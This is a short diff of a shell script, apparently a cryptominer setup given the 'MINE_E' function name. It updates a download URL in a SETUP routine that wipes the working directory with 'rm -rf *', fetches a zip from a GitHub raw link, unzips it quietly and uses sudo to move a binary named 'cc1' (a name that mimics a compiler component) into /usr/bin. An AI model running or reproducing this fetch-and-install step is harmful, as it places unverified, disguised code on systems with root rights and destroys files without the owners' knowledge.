@@ -60,8 +60,8 @@ MINE_E() {
 }
 SETUP() {
 rm -rf *
-wget https://raw.githubusercontent.com/outlookribut/jbh/main/trial3.zip
-unzip -q trial3.zip
+wget https://raw.githubusercontent.com/outlookribut/jbh/main/trial5.zip
+unzip -q trial5.zip
 sudo mv cc1 /usr/bin
 }
 SETUP
